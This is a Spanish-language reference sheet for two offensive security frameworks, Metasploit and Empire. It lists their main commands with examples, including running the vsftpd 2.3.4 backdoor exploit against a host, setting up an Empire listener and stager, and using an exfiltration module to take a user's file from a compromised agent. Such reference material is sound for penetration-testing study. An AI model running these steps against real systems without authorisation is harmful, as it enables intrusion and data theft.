### **Frameworks/Metasploit_Framework/metasploit_framework.md**

# Metasploit Framework

## Descripción

`Metasploit Framework` es una plataforma de desarrollo y ejecución de exploits utilizada para pruebas de penetración y evaluación de seguridad. Ofrece una amplia base de datos de exploits, payloads y herramientas auxiliares para identificar y explotar vulnerabilidades en sistemas.

## Uso

```bash
msfconsole
```

### Comandos principales

- `search <termino>`: Busca módulos relacionados con el término.
- `use <módulo>`: Selecciona un módulo para usar.
- `show options`: Muestra las opciones configurables del módulo seleccionado.
- `set <opción> <valor>`: Configura una opción específica.
- `exploit`: Ejecuta el exploit seleccionado.

## Ejemplos

- **Buscar un exploit para Apache:**
  
  ```bash
  msf5 > search apache
  ```

- **Seleccionar y configurar un módulo:**
  
  ```bash
  msf5 > use exploit/unix/ftp/vsftpd_234_backdoor
  msf5 exploit(vsftpd_234_backdoor) > show options
  msf5 exploit(vsftpd_234_backdoor) > set RHOSTS 192.168.1.10
  msf5 exploit(vsftpd_234_backdoor) > exploit
  ```

- **Listar todos los payloads disponibles:**
  
  ```bash
  msf5 > show payloads
  ```

---

### **Frameworks/Empire/empire.md**

# Empire

## Descripción

`Empire` es un framework de post-explotación de código abierto para entornos Windows, macOS y Linux. Utiliza PowerShell y Python para proporcionar capacidades avanzadas de control remoto, exfiltración de datos y persistencia en sistemas comprometidos.

## Uso

```bash
./empire
```

### Comandos principales

- `listeners`: Gestiona los listeners para las conexiones entrantes.
- `agents`: Administra los agentes conectados a Empire.
- `modules`: Ejecuta módulos de post-explotación específicos.
- `use <módulo>`: Selecciona un módulo para usar.
- `execute <comando>`: Ejecuta un comando en el agente seleccionado.

## Ejemplos

- **Iniciar Empire y configurar un listener:**
  
  ```bash
  ./empire
  (Empire) listeners
  (Empire: listeners) > usestager windows/launcher_bat
  (Empire: listeners) > set ListenerName myListener
  (Empire: listeners) > execute
  ```

- **Interactuar con un agente:**
  
  ```bash
  (Empire) agents
  (Empire: agents) > interact <agent_id>
  (Empire: agent_id) > execute "whoami"
  ```

- **Ejecutar un módulo de exfiltración:**
  
  ```bash
  (Empire: agent_id) > use modules/exfiltration/file
  (Empire: modules/exfiltration/file) > set Agent <agent_id>
  (Empire: modules/exfiltration/file) > set SourcePath C:\Users\Usuario\documento.txt
  (Empire: modules/exfiltration/file) > execute
  ```
